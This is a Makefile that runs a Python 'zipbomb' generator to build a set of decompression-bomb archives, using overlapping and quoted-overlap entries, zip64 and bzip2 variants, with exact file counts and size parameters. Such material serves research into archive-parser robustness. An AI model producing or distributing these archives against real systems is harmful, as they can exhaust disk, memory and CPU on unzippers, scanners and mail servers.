ZIPBOMB = python3 zipbomb

.PHONY: all
all: overlap.zip zbsm.zip zbsm.extra.zip zblg.zip zblg.extra.zip zbxl.zip zbxl.extra.zip zbbz2.zip

# 16-bit hex tag ID to use for extra-field quoting.
EXTRA = 9999

overlap.zip:
	$(ZIPBOMB) --mode=full_overlap --alphabet ABCDEFGHIJKLMNOPQRSTUVWXYZ --num-files=26 --compressed-size=10000 > "$@"

zbsm.zip:
	$(ZIPBOMB) --mode=quoted_overlap --num-files=250 --compressed-size=21179 > "$@"
zbsm.extra.zip:
	$(ZIPBOMB) --mode=quoted_overlap --num-files=252 --compressed-size=21260 --extra=$(EXTRA) > "$@"

zblg.zip:
	$(ZIPBOMB) --mode=quoted_overlap --num-files=65534 --max-uncompressed-size=4292788525 > "$@"
zblg.extra.zip:
	$(ZIPBOMB) --mode=quoted_overlap --num-files=65534 --max-uncompressed-size=4292846565 --extra=$(EXTRA) > "$@"

zbxl.zip:
	$(ZIPBOMB) --mode=quoted_overlap --num-files=190023 --compressed-size=22982788 --zip64 > "$@"
zbxl.extra.zip:
	$(ZIPBOMB) --mode=quoted_overlap --num-files=190023 --compressed-size=22982788 --zip64 --extra=$(EXTRA) > "$@"

zbbz2.zip:
	$(ZIPBOMB) --mode=quoted_overlap --algorithm=bzip2 --num-files=1809 --max-uncompressed-size=4294967294 --extra=$(EXTRA) > "$@"

# Not made by default.
zbxxl.zip:
	$(ZIPBOMB) --mode=quoted_overlap --num-files=12056313 --compressed-size=1482284040 --zip64 > "$@"
zbxxl.extra.zip:
	$(ZIPBOMB) --mode=quoted_overlap --num-files=12056313 --compressed-size=1482284040 --zip64 --extra=$(EXTRA) > "$@"

.DELETE_ON_ERROR:
